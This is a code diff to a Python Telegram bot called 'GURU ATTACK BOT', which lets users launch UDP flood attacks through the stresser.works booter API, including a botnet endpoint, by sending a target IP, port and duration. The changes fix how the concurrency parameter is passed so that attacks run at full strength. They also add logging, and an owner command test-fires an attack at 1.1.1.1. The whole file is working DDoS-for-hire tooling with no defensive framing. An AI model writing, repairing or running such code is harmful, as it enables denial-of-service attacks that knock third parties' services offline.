@@ -35,7 +35,6 @@ MAX_DURATION = 80
 RATE_LIMIT_SECONDS = 10
 
 # ===== ATTACK METHODS =====
-# Default method is UDP-Gbps (botnet). UDP-BIG is the backup.
 ATTACK_METHODS = ["UDP-Gbps", "UDP-BIG"]
 DEFAULT_METHOD = "UDP-Gbps"
 
@@ -49,9 +48,14 @@ METHOD_ENDPOINT = {
     "UDP-BIG": "/api/start",
 }
 
+# The param NAME each endpoint expects for concurrency
+METHOD_CONCURRENT_PARAM = {
+    "UDP-Gbps": "concurrent",   # /api/botnet/start accepts `concurrent`
+    "UDP-BIG": "concs",         # /api/start accepts `concs`
+}
+
 
 def resolve_method(raw):
-    """Case-insensitive method matching. Returns canonical name or None."""
     if not raw:
         return None
     r = raw.strip().lower()
@@ -619,7 +623,13 @@ init_pseudo_owner()
 
 # ===== API FUNCTIONS =====
 async def send_api_attack(target, port, duration, method):
-    """Call stresser.works API. Handles both response shapes (ok / success)."""
+    """
+    Call stresser.works API.
+
+    Concurrency is handled BY THE API via the concurrency param:
+      - UDP-Gbps  → /api/botnet/start  uses `concurrent=2`
+      - UDP-BIG   → /api/start         uses `concs=4`
+    """
     if not API_TOKEN:
         return {"success": False, "error": "API_TOKEN missing"}
 
@@ -627,13 +637,17 @@ async def send_api_attack(target, port, duration, method):
     if not endpoint:
         return {"success": False, "error": f"Unknown method {method}"}
 
+    conc = METHOD_CONCURRENT.get(method, 1)
+    conc_param = METHOD_CONCURRENT_PARAM.get(method, "concs")
     url = API_BASE.rstrip('/') + endpoint
+
     params = {
         "token": API_TOKEN,
         "host": target,
         "port": str(port),
         "time": str(duration),
         "method": method,
+        conc_param: str(conc),          # <-- the fix: send concs/concurrent
     }
     if method == "UDP-BIG":
         params["geolocation"] = "ALL"
@@ -644,10 +658,11 @@ async def send_api_attack(target, port, duration, method):
         "Connection": "keep-alive",
     }
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
-    conc = METHOD_CONCURRENT.get(method, 2)
 
-    logger.info(f"🚀 {method} → {target}:{port} for {duration}s ({conc}c)")
+    logger.info(f"🚀 {method} → {target}:{port} for {duration}s ({conc}c via {conc_param})")
     logger.info(f"🔗 URL: {url}")
+    logger.info(f"📋 Params: host={target} port={port} time={duration} "
+                f"method={method} {conc_param}={conc}")
 
     try:
         async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
@@ -655,12 +670,12 @@ async def send_api_attack(target, port, duration, method):
             async with session.get(url, params=params) as resp:
                 elapsed = time.time() - start
                 text = await resp.text(encoding='utf-8', errors='ignore')
-                logger.info(f"📊 API Response: {resp.status} in {elapsed:.2f}s — {text[:200]}")
+                logger.info(f"📊 API Response: {resp.status} in {elapsed:.2f}s — {text[:300]}")
 
                 try:
                     data = json.loads(text)
                 except Exception:
-                    data = {"raw": text[:200]}
+                    data = {"raw": text[:300]}
 
                 ok = False
                 if resp.status == 200 and isinstance(data, dict):
@@ -748,7 +763,7 @@ class AttackManager:
                 'start_time': datetime.now(),
                 'duration': duration,
                 'method': method,
-                'concurrent': METHOD_CONCURRENT.get(method, 2),
+                'concurrent': METHOD_CONCURRENT.get(method, 1),
                 'task': None,
             }
             task = asyncio.create_task(
@@ -775,7 +790,7 @@ class AttackManager:
 
     async def execute_attack(self, attack_id, target, port, duration,
                              user_id, context, method):
-        concurrent = METHOD_CONCURRENT.get(method, 2)
+        concurrent = METHOD_CONCURRENT.get(method, 1)
         start = time.time()
 
         try:
@@ -1067,7 +1082,8 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 method = resolved
 
     msg = await update.message.reply_text(
-        f"🔬 Testing `{method}` on `{host}:{port}`…",
+        f"🔬 Testing `{method}` on `{host}:{port}` with "
+        f"{METHOD_CONCURRENT.get(method,1)}c…",
         parse_mode='Markdown',
     )
     r = await send_api_attack(host, port, 10, method)
@@ -1075,6 +1091,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(
             f"✅ API OK\n\n"
             f"Method: `{method}`\n"
+            f"Concurrent: `{r.get('concurrent')}`\n"
             f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
             f"Attack ID: `{r.get('attack_id')}`\n"
             f"Raw: `{str(r.get('response'))[:150]}`",
@@ -1227,7 +1244,7 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not resolved:
         resolved = DEFAULT_METHOD
     context.user_data['attack_method'] = resolved
-    conc = METHOD_CONCURRENT.get(resolved, 2)
+    conc = METHOD_CONCURRENT.get(resolved, 1)
     await query.edit_message_text(
         f"📡 *Method: {resolved}* ({conc}c)\n\n"
         f"Send: `IP PORT TIME`\n"
@@ -1944,12 +1961,12 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     r = await send_api_attack("1.1.1.1", 80, 10, DEFAULT_METHOD)
     if r.get("success"):
-        text = (f"✅ API OK (default method: {DEFAULT_METHOD})\n\n"
+        text = (f"✅ API OK (default: {DEFAULT_METHOD} @ {r.get('concurrent')}c)\n\n"
                 f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
                 f"Attack ID: `{r.get('attack_id')}`\n"
                 f"Raw: `{str(r.get('response'))[:150]}`")
     else:
-        text = (f"❌ API FAILED (default method: {DEFAULT_METHOD})\n\n"
+        text = (f"❌ API FAILED (default: {DEFAULT_METHOD})\n\n"
                 f"Error: `{r.get('error')}`\n"
                 f"Raw: `{str(r.get('response'))[:150]}`")
     await query.edit_message_text(
@@ -2012,17 +2029,14 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     saved_method = context.user_data.get('attack_method')
 
     if len(parts) == 3 and saved_method:
-        # User chose via menu then typed just IP PORT TIME
         parts.append(saved_method)
     elif len(parts) >= 4 and saved_method:
-        # If they typed a method, respect it (override menu)
         resolved = resolve_method(parts[3])
         if resolved:
             parts[3] = resolved
         else:
             parts[3] = saved_method
     elif len(parts) == 3:
-        # Fall back to DEFAULT_METHOD (UDP-Gbps)
         parts.append(DEFAULT_METHOD)
 
     context.args = parts
@@ -2042,10 +2056,10 @@ def main():
     print("=" * 60)
     print("🔥 GURU ATTACK BOT — stresser.works API")
     print("=" * 60)
-    print(f"Default method: {DEFAULT_METHOD} (2 concurrent)")
+    print(f"Default: {DEFAULT_METHOD} (2 concurrent via `concurrent=2`)")
     print("Methods:")
-    print("  UDP-Gbps  → /api/botnet/start  (2 concurrent) DEFAULT")
-    print("  UDP-BIG   → /api/start         (4 concurrent) BACKUP")
+    print("  UDP-Gbps  → /api/botnet/start  concurrent=2  DEFAULT")
+    print("  UDP-BIG   → /api/start         concs=4       BACKUP")
     print("=" * 60)
 
     bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
